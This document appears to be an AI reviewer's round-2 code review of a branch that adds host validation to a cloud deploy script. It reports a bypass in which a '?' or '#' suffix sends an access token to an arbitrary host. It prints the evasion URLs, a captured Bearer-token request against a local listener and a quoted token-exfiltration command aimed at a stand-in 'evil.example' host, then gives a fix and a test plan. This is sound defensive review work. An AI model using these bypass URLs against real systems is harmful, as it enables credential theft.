# `fix/adc-preflight` (ptone/scion, `5b5f4ce9`): round-2 DELTA review

Reviewer: sn-adcpreflight-rev2. Date: 2026-08-27. Task #85, review round 2.
Scope: `985f1c40..5b5f4ce9` (the round-2 delta), with R7 (`2260887e..5b5f4ce9`) as the focus.
3 files, +540/−108. Round 1 (`reviews/adc-preflight-r1.md`) stands; nothing below contradicts it.

## Executive Summary

**Risk level: HIGH.** All five round-1 findings are genuinely fixed and all eight claimed pins are
real — I reproduced every one by mutation, including the constant-token trap. But the host validation
that the architect attached as the *condition* for widening `_DI_API_BASE` **does not hold**: it is
defeated by a one-character suffix (`?` or `#`), and I have delivered a live-shaped Bearer token to an
arbitrary host through it. The override's reasoning was right; the condition it depended on was not met.

**Verdict: fail — REQUEST CHANGES.** One Critical, one Required. Everything else is Optional or FYI.

---

## Critical

### Critical 1 — The host check is defeated by a query or fragment suffix. Both seams. Token exfiltration.

`di_validate_override_url` extracts the host as:

```bash
local host="${url#*://}"
host="${host%%/*}"          # strips the PATH only
```

It strips the path but **not the query (`?`) or fragment (`#`)**. Everything after them is still part
of the string matched against `*.googleapis.com`. So an attacker-chosen host followed by
`?.googleapis.com` passes.

Measured against the real function, extracted verbatim from `scripts/single-node/deploy.sh`:

```
reject https://evil-googleapis.com          reject https://x@evil.tld
reject https://googleapis.com.evil.tld      reject https://foo.googleapis.com@evil.tld
reject https://evil.tld/x.googleapis.com    reject https://127.0.0.1.evil.tld
ALLOW  https://evil.tld?.googleapis.com     <-- bypass
ALLOW  https://evil.tld#.googleapis.com     <-- bypass
ALLOW  https://evil.tld:8080?.googleapis.com
ALLOW  https://evil.tld?x=.googleapis.com
```

The obvious prefix/suffix evasions the brief asked about — `evil-googleapis.com`,
`googleapis.com.evil.tld`, userinfo, ports, IPv6 loopback — are all correctly rejected. The port regex
and the `[::1]` preservation are right. It is the `?`/`#` case, and only that case, that is open.

**This is not theoretical. I ran it end-to-end.**

Against the real `di_preflight_rest_credential`, with a stub `gcloud`:

```
### CASE A: _DI_API_BASE=https://evil.example              (the case the new test covers)
Error: refusing to send an access token to host 'evil.example'.     exit=1   -- no token minted

### CASE B: _DI_API_BASE=https://evil.example?.googleapis.com       (untested)
    Minting ADC token...
    ADC token minted (19 chars, prefix: ya29...)
    Validating ADC token against Cloud Run API...
    GET https://evil.example?.googleapis.com/v2/projects/proj/locations/us-east4/instances
```

The gate is passed and the token is minted and sent. And curl really does connect to the host *before*
the `?`. Against a local listener (curl 7.88.1):

```
### curl "http://<host>:9099?.googleapis.com/v2/projects/p/locations/r/instances"
GET /?.googleapis.com/v2/projects/p/locations/r/instances HTTP/1.1
Host: 127.0.0.1:9099
Authorization: Bearer ya29.SECRETTOKEN          <-- the ADC token, delivered

### curl "http://<host>:9099#.googleapis.com/..."   (fragment is dropped, connection is not)
GET / HTTP/1.1
Authorization: Bearer ya29.SECRETTOKEN          <-- the ADC token, delivered

### tokeninfo shape: curl "<url>?access_token=$tok"  with _DI_TOKENINFO_URL=http://<host>:9099?.googleapis.com
GET /?.googleapis.com?access_token=ya29.SECRETTOKEN HTTP/1.1     <-- the token, in the query string
```

So the exact scenario round 1 raised — *`_DI_TOKENINFO_URL=https://evil.example bash <(curl ...)`
exfiltrates a live cloud-platform token in a query string* — still works. It just needs one extra
character. And the `_DI_API_BASE` half now leaks a Bearer on a **mutating** call as well.

**This is the failure mode the brief itself named**: "a host check that is fooled by string prefixing is
worse than none, because it converts a known-open seam into one people believe is closed." That is
precisely what has happened. `_DI_API_BASE` went from *documented as unrestricted* to *documented as
restricted and believed safe*, and the restriction is bypassable. The comment in
`di_build_iap_patch_url` now asserts "the preflight validates its host … before any mutation runs" —
an assertion that is currently false for the `?`/`#` inputs.

Note on attribution: the `_DI_TOKENINFO_URL` half of this defect arrived in `e0ca5237`, not in R7, and
round 1 never saw the implementation (it only recommended the check). R7 extended the same defective
extraction to a second seam and to a write. Both are inside this round's delta, so both are in scope.

**Suggested fix — three lines, shellcheck-clean, whole suite stays green (verified):**

```bash
  local host="${url#*://}"
  host="${host%%[/?#\\]*}"   # strip path, query, fragment and backslash
  host="${host##*@}"         # strip userinfo -- curl uses the LAST '@'
  host="${host,,}"           # hosts are case-insensitive
```

Verified against the full evasion set: every legitimate value above still ALLOWs (including
`https://FOO.GOOGLEAPIS.COM`, which the current code wrongly rejects), and `?`, `#`, `\` and userinfo
all reject. `/tmp/shellcheck -x --source-path=SCRIPTDIR` clean; `go test ./cmd/ -run TestScript` still
37/0/0 with the patch applied.

(`\` is fail-closed in curl 7.88 today — I measured exit 000, no connection — but it costs nothing to
strip and other curl builds parse it differently.)

**And pin it.** `di_validate_override_url` has no unit test of its own; it is only reached through the
preflight, and `TestScriptPreflightRejectsNonGoogleAPIBase` / `…TokeninfoHost` each test exactly one
input (`https://evil.example`). That is why a bypass this shallow survived. Add a table-driven
`runBashFunc(t, "di_validate_override_url", "_DI_API_BASE", <url>)` test with the allow and reject rows
above. It is the cheapest test in this change and the highest-value one, because it is the only test
that would have caught this.

---

## Required

### Required 1 — The 403 remedy asserts a cause that is often wrong, and names a fix that will not work

```bash
echo "HTTP 403 means the credential is valid but its identity is not authorized." >&2
echo "Fix: grant the ADC identity 'run.instances.list' on project '$project'" >&2
```

The permission name and the project interpolation are correct, and this is a real improvement on the
generic message for the IAM case — round 1 measured exactly that case.

But round 1 also measured, on the same call and the same API, a **different** 403:

```
HTTP 403: "Cloud Run Admin API has not been used in project test-project..."
```

That is Google's standard `SERVICE_DISABLED`. It is a 403, the credential is valid, and the identity is
*not* unauthorized — the API is simply off. Granting `run.instances.list` or `roles/run.viewer` will not
fix it; `gcloud services enable run.googleapis.com` will. And a disabled Cloud Run Admin API is the
single most likely 403 for this script's audience: someone running a single-node deploy into a fresh
project for the first time.

The current text does not hedge — it states the cause as fact and then gives a remedy for that cause
only. The response body is printed one line above, which is the mitigation, but an operator who reads
the imperative "Fix:" line will go spend an hour in the IAM console.

I am labelling this Required rather than Optional, and I want the inconsistency on the record: round 1
labelled the *worse* (generic) version Optional. My reasoning for the upgrade is that a message which
asserts a wrong cause is more expensive than one which asserts none.

**Suggested fix (~3 lines, and `assert.Contains(t, stderr, "run.instances.list")` still passes):**

```bash
echo "HTTP 403 usually means one of two things — check the response body above:" >&2
echo "  - the API is not enabled:  gcloud services enable run.googleapis.com --project '$project'" >&2
echo "  - the identity lacks the role: grant 'run.instances.list' on project '$project'" >&2
echo "    (for example roles/run.viewer), or switch accounts with" >&2
echo "    'gcloud auth application-default login' and retry." >&2
```

---

## Answers to the brief, §1 — the override, checked adversarially

### Q1: "same variable, same token, no new class of risk" — is it true?

**Half true, and the false half matters.**

**True:** the *credential exposure* is identical. A Bearer header on a GET and a Bearer header on a
PATCH hand the attacker the same token with the same scope. There is no read/write asymmetry in what
leaks. On that narrow point you were right, and the instinct that it did not warrant a separate rule
was correct.

**False:** there is a new class of risk, but it is not credential exposure — it is **deploy integrity**.
Before R7, a redirected `_DI_API_BASE` could only make the preflight lie. After R7 it also silently
no-ops the security-critical mutation: step 3b PATCHes the attacker's endpoint, gets whatever status
that endpoint returns, prints `IAP enabled on instance.`, and moves on — while the real Instance,
already created by step 3a, sits with IAP **off**. That is the exact half-built deploy this entire
change exists to prevent, now reachable through the seam that the change widened.

**The backstop holds, and it is worth crediting.** I checked: `di_build_instance_url` does *not* honour
`_DI_API_BASE`, so step 4's `di_wait_for_iap "$instance_url"` polls the real `run.app` URL, finds IAP
not enforcing, and fails the deploy. So the script cannot report false success. What it can do is leave
a created, IAP-less Instance behind — the failure mode, in kind if not in cause, of the original bug.

This does not by itself mean the widening was wrong. It means the validation you attached as a
condition was load-bearing for more than you thought, which makes Critical 1 worse than it would
otherwise be.

### Q2: does the validation close what it claims to close?

**No.** See Critical 1. It closes every evasion you listed — `evil-googleapis.com`,
`googleapis.com.evil.tld`, userinfo, ports, IPv6 loopback — and misses `?`/`#`, which is the same
class and one character cheaper. **You were right to worry about exactly this, and right that it is
worse than no check**: `_DI_API_BASE` is now documented in three places as validated, and it is not.

### Q3: is validating in the preflight on behalf of step 3b sound, or orphanable?

**Sound today, orphanable tomorrow, and there is a strictly better shape available for the same cost.**

Why it holds today: the preflight is the only path that sets `_di_adc_token`; step 3b hard-fails on an
empty token; and `TestScriptPreflightRunsBeforeInstanceCreation` pins preflight-before-3a. Three
independent reasons. The developer's argument is not hand-waving.

Why it is fragile: the invariant is *"the preflight always runs, and runs first"*, and nothing pins the
half that matters here — *"nothing reads `_DI_API_BASE` without having been validated."* Two plausible
future changes orphan it silently: a `--skip-preflight` escape hatch, or a second caller of
`di_build_iap_patch_url`. Neither would fail a test. Note that the developer's own comment already
carries the smell: `di_build_iap_patch_url` now documents an invariant it does not enforce and cannot
see, which is the definition of a validation held at a distance.

**Propose the move — and it does not cost the "pure echo helper" property:** resolve and validate
`_DI_API_BASE` **once in `di_main`**, before the preflight, and pass the resulting base as a parameter
to both `di_preflight_rest_credential` and `di_build_iap_patch_url`. The helper stays pure — it just
takes one more argument instead of reading the environment. The seam is then read in exactly one place
and validated in exactly one place, the ordering dependency disappears entirely, and there is no
configuration in which an unvalidated base reaches a curl. That is strictly fewer moving parts than
what is there now, not more.

I am labelling this **Optional**, not Required: the current arrangement is defensible and the delta's
real defect is Critical 1, not placement. But since Critical 1 forces this function open anyway, this
is the pass to do it in.

### Was the override a mistake? — the plain answer you asked for

**No, and I would have made it too.** Your reasoning was correct on the part that was hard: nothing
pinned "step 3b reuses the preflight token", that property is the one that failed for ptone, and a
re-mint inside 3b left every test green. I verified all of that by mutation (m7, below) — the pin the
widening bought is real, it is the strongest new test in this change, and there was no cheaper way to
buy it. The marginal *credential* exposure really is near zero, as you judged.

**Where you were wrong is narrower and it is the thing you asked me to check: you accepted that the
condition had been satisfied.** It has not. The check you attached is bypassable, and a bypassable
check on a widened seam is a worse position than the unrestricted-but-honestly-documented seam round 1
signed off on. Land the three-line extraction fix and the table-driven test, and your override becomes
correct as stated. Without them, R7 is a net regression on the security axis.

---

## Answers to the brief, §2 — the two items round 1 never saw

### 2a — the 403 remedy

Wording is accurate for the IAM case and misleading for the API-disabled case. See **Required 1**.

### 2b — the empty-`http_code` guard

**The unreachability claim is correct. I verified it rather than reading it.**

```
$ out=$(curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:1/); echo "exit=$? out='$out'"
exit=7 out='000'
```

`%{http_code}` always emits something — `000` when there is no HTTP response, never the empty string —
and every no-response path exits non-zero, which the `|| { … return 1; }` catches first. The assignment
is in the split form (`local http_code` then `http_code="$(…)"`), so `set -e` masking does not defeat
the `||`. There is no input that reaches `[[ -z "$http_code" ]]` with an empty value.

**"Keep it, comment it, do not test it" was the right call**, and the comment is honest about why. A
test would have to stub `curl` into a state curl does not produce, which pins the stub, not the script.

**Optional refinement:** the guard would be strictly stronger as a numeric check rather than an
emptiness check:

```bash
if [[ ! "$http_code" =~ ^[0-9]+$ ]]; then
```

This catches the same case plus anything non-numeric, and it costs one line. Worth noting that
`[[ "$http_code" -ge 300 ]]` evaluates a non-numeric string as `0` and **passes** — so the fail-open
the guard exists to prevent has a slightly wider mouth than "empty". Still unreachable; still one line.

---

## Answers to the brief, §3 — the pins, verified by mutation

I mutated the tree and ran the suite for each. **All eight claimed pins are real. None escaped.**

| # | Mutation | Test that went RED |
|---|---|---|
| m1 | Preflight block moved below step 3a (r1's original defect, restored in full) | `TestScriptPreflightRunsBeforeInstanceCreation` |
| m2 | `gcloud auth application-default print-access-token` → `gcloud auth print-access-token` | **7 tests** RED (argv assertions across the board) |
| m3 | `echo "    Resolving ADC identity via $tokeninfo_url"` deleted | `TestScriptPreflightSucceedsWithMatchingIdentity` |
| m4 | `azp` folded back into the identity comparison (r1 Required 3, restored) | `TestScriptPreflightSkipsComparisonWhenTokeninfoOmitsEmail` |
| m5 | 403 branch reverted to the generic remedy | `TestScriptPreflightAbortsOnNon2xxGet` |
| m6 | `di_validate_override_url "_DI_TOKENINFO_URL"` call deleted | `TestScriptPreflightRejectsNonGoogleTokeninfoHost` |
| m7 | Step 3b re-mints its own token instead of reusing `$_di_adc_token` | `TestScriptStep3bReusesPreflightToken` |
| m8 | `di_validate_override_url "_DI_API_BASE"` call deleted | `TestScriptPreflightRejectsNonGoogleAPIBase` |

**m8 — the developer's stronger claim is true.** It does not merely fail; it fails on *two* assertions,
and the second is the one that proves placement:

```
Error: "...does not contain \"_DI_API_BASE\""              <- the var-name diagnostic is pinned
Error: file ".../gcloud-argv.log" exists                    <- NoFileExists: the check runs BEFORE the mint
```

So the test genuinely distinguishes "the check runs" from "the check runs before the token exists."

**m7 — the constant-token trap is real, and the counter genuinely fixes it.** I reproduced the trap
rather than taking it on trust. Reverting the stub to a single fixed token *and* neutering the
mint-count assertion, with m7 applied:

```
--- PASS: TestScriptStep3bReusesPreflightToken     <-- green under its own mutation. The trap is real.
```

Restore *either* half and it goes red. With the per-mint counter restored and the count assertion still
neutered, the Bearer assertion alone catches it; with the constant token restored and the count
assertion intact, the count alone catches it. The pin is doubly redundant, which is the right build for
a property that has already fooled one test once.

**Also verified: the ordering pin is independent of the 3b pin.** Under m7 (`3b re-mints`),
`TestScriptPreflightRunsBeforeInstanceCreation` stayed GREEN, and under m6/m8 it was unaffected. The two
pins fail on different mutations, which is what makes them two pins rather than one restated twice.

### Did I find another pin with the same shape? — one, and it is pre-existing

**m9 — the default host of the PATCH URL is not pinned by anything.** I changed
`${_DI_API_BASE:-https://${region}-run.googleapis.com}` to
`${_DI_API_BASE:-https://run.googleapis.com}` — dropping the regional endpoint — and the **entire
`TestScript` suite stayed green.** `TestScriptEnableIAPUpdateMask` is the only test of
`di_build_iap_patch_url` and it asserts on the `updateMask` only, never the host.

I checked whether this is R7's fault: it is not. Applying the equivalent mutation at `2260887e`
(pre-R7, when the URL was a fixed literal) is also all-green. **Pre-existing gap, not a regression.**
But R7 converted that line from a constant into an environment-dependent expression, which is exactly
when a default-branch pin starts earning its keep. One `assert.Contains(t, url,
"https://us-east4-run.googleapis.com/v2/")` in the existing test closes it. **Optional.**

---

## Answers to the brief, §4 — the two unasked-for changes

**1. Factoring into `di_validate_override_url(var_name, url)` — right call, keep it.** Two seams under
one rule is the correct model; two near-identical inline blocks is how they drift. Passing `var_name`
so the diagnostic says which seam is at fault is the kind of detail that gets skipped, and m8 proves
it is not decorative — the test asserts on it and goes red without it. The one cost is that a single
extraction bug now compromises both seams instead of one, which is exactly what Critical 1 is. That is
an argument for testing the helper directly, not for un-factoring it.

**2. Leaving the ordering pin aborting at step 3a — right call, and I verified the reasoning holds.**
The argument is that the pin covers the order of two `gcloud` calls and should not acquire a dependency
on `_DI_API_BASE` continuing to exist. I confirmed this empirically: under m7 the ordering pin stayed
green (it never reaches 3b), and it asserts only on recorded `gcloud` argv. If the `_DI_API_BASE` seam
were removed tomorrow, `TestScriptStep3bReusesPreflightToken` would break and the ordering pin would
not. That separation is correct and the corrected doc comment is accurate.

---

## Nit / Optional

1. **Optional — hoist the `_DI_API_BASE` resolution into `di_main` and pass it as a parameter.**
   See §1 Q3. Removes the at-a-distance validation without giving up the pure-helper property.
2. **Optional — pin the default PATCH host.** m9 above. One `assert.Contains`.
3. **Optional — make the empty-`http_code` guard a numeric check.** §2b above. One line.
4. **Nit — the host check is case-sensitive and wrongly rejects `https://FOO.GOOGLEAPIS.COM`.**
   Hostnames are case-insensitive. Fail-closed, so harmless; the `${host,,}` in the Critical 1 fix
   resolves it for free.
5. **Nit — a trailing-dot FQDN (`https://oauth2.googleapis.com.`) is rejected.** Also fail-closed. Not
   worth code on its own; mentioned only so it is a known behaviour rather than a surprise.

## FYI

- **Round 1's five findings are all genuinely closed**, each confirmed by mutation (m1–m6 above), not
  by reading. Required 2's non-hermeticity is closed structurally: `preflightSetup` forces both seams
  at every call site, so a test cannot silently escape to the network.
- **The suite is hermetic.** With external egress blackholed for curl (`http(s)_proxy` pointed at a
  dead port, `no_proxy=127.0.0.1,localhost`), all **9** preflight/3b tests pass. Nothing reaches the
  internet.
- **The test harness does not scrub the ambient environment.** `runBashFunc` inherits the caller's
  env, so an exported `_DI_API_BASE` in a developer's shell reaches `di_build_iap_patch_url` in
  `TestScriptEnableIAPUpdateMask`. No test currently depends on the default, so nothing breaks today —
  but if you take Optional 2, add `cmd.Env` scrubbing with it, or the new pin will be defeatable by an
  ambient variable.
- **r1's Optional 2 (dead `name` parameter) is fixed** — the parameter and the call-site argument are
  both gone, and the doc comment was updated to match.

## Positive Feedback

- **The mutation discipline is real, and it caught something I would have missed.** The developer found
  that the obvious form of the m7 pin was green under its own mutation, and fixed the *stub* rather than
  weakening the assertion. I reproduced the trap and it is exactly as described. That is the correct
  response to a false pin and it is not the common one.
- **`TestScriptPreflightRejectsNonGoogleAPIBase`'s `NoFileExists(argvLog)` assertion** is a better test
  than it had to be. Asserting the check runs *before the token exists* — rather than merely that it
  runs — is the difference between pinning a behaviour and pinning a code path.
- **The comment on the empty-`http_code` guard** states the reachability argument, the reason the guard
  is kept anyway, and the reason it is untested. A future reader will not delete it as dead code and
  will not waste an afternoon writing the test. That is what a comment is for.
- **The identity-comparison fix (r1 Required 3) is the right shape**, not a patch over the symptom: it
  distinguishes "no email claim" from "email mismatch" rather than suppressing the warning.

## Test Coverage

Strong, with one hole that is the same hole as Critical 1. Nine tests now cover the preflight and step
3b; eight of the nine distinguish the clean tree from a specific mutation, which is the only coverage
question that matters here and is a complete reversal of round 1's position (where four tests
distinguished nothing).

The gap: `di_validate_override_url` — the newest and most security-sensitive function in the change —
has **no direct unit test** and is exercised with exactly one rejected input per seam. A single
table-driven test would have caught Critical 1 before it left the developer's machine. Add it with the
fix.

Unchanged and still true from round 1: step 6 remains untested since `GoogleCloudPlatform/scion#1325`.

## Backward Compatibility

No wire-format or flag-surface changes in this delta. `di_preflight_rest_credential`'s arity dropped
from 4 to 3 (the dead `name` parameter); it is script-internal with one call site, updated. One
behaviour change for operators beyond round 1's: `_DI_TOKENINFO_URL` and `_DI_API_BASE` now hard-fail
on a non-Google host. Both are undocumented test-only seams, so no supported usage breaks.

## Final Verdict

**REQUEST CHANGES** — Critical 1 (bypassable host validation on both seams, live token exfiltration
demonstrated) and Required 1 (403 remedy asserts a cause that is frequently wrong). Overall disposition
**fail**: the delta's central claim — that `_DI_API_BASE` was widened *under a validation* — is not
currently true, and that claim is now asserted in three comments and two tests.

Everything else in the delta is good work and should be kept as-is. The fix is small and localised:
three lines in the extraction, one table-driven test, five lines of 403 wording.

### Gates run

| Gate | Result |
|---|---|
| `gofmt -l cmd/` | **clean** |
| `go vet ./cmd/` | **clean** |
| `go build ./...` | **clean** |
| `go test ./cmd/ -run TestScript` | **37 pass / 0 fail / 0 skip** — matches the claim exactly |
| `go test ./cmd/` (whole package) | **ok** |
| `shellcheck 0.9.0`, CI-exact `-x --source-path=SCRIPTDIR` over CI's exact `find` | **62/62 passed** |
| Preflight + 3b tests with external egress blackholed | **9/9 pass**, zero external requests |
| Mutations m1–m8 | **all RED** — no pin escaped |
| m7 trap reproduction (constant-token stub) | **confirmed** — pin green under its own mutation, both halves of the fix independently sufficient |
| m9 (default PATCH host) | **ESCAPED** — pre-existing, also escapes at `2260887e` |
| Host-validator evasion suite (22 inputs) | **2 bypasses**, confirmed end-to-end against curl and against the real preflight |
| Proposed fix: shellcheck + full suite | **clean / 37 pass** |
| Rebase onto `upstream/main` | **clean**, suite green after |

**Not run, with reason:** no live deploy. Round 1 walked it end to end and the brief says none is
needed for this delta; nothing in this delta changes runtime behaviour on the success path. **I touched
no GCP project and created, restarted or deleted no Instance.** `golangci-lint` was not run — CI invokes
it with `--new-from-merge-base=origin/main` and the binary is absent from this container; `go vet` and
`gofmt` are clean, which is the narrowest real gate available here.

### Rebase state

`ahead 6 / behind 1` against `GoogleCloudPlatform/scion` `main` — **your counts are correct.** The one
upstream commit is `cca1f87d` (`GoogleCloudPlatform/scion#1329`, admin permission checks), Go-only, no
overlap with the three files in this branch. `git rebase upstream/main` succeeds cleanly and
`go test ./cmd/ -run TestScript` is green afterwards.

## Corrections to the review brief

You asked to be told what is wrong. Two things, neither of which changes the outcome.

1. **§3 header, "Eight mutations are claimed, all red" — accurate, but the count of *tests* is nine,
   not eight.** §5 says "all 8 preflight/3b tests green with egress blackholed"; there are nine
   (`TestScriptPreflight*` × 7, plus `RunsBeforeInstanceCreation` and `Step3bReusesPreflightToken`).
   Worth fixing before handoff because "8 of 8" is the kind of number ptone will re-run.

2. **§1, "extending it to the PATCH is the same variable and the same token" — the sentence is true and
   the conclusion drawn from it is not.** The exposure is identical; the *consequence* is not, because
   step 3b is the mutation whose failure defines this bug. A redirected PATCH leaves a created Instance
   with IAP off. Step 4's poll of the real `run.app` URL catches it, so the script cannot report false
   success — but the framing "no new class of risk" understates what the validation was holding up.
   Detail in §1 Q1 above.

3. **FYI, not a brief error** — `TestScriptCheckGcloudInstances_FailureMessage` **passes** in my
   container where round 1 saw it **skip**, because no `gcloud` is installed here. That is why my count
   is 37/0/0 and round 1's was 31/1/0 at a different commit. Same trap round 1 flagged as its
   correction 4: the visible test count depends on the runner's SDK state.
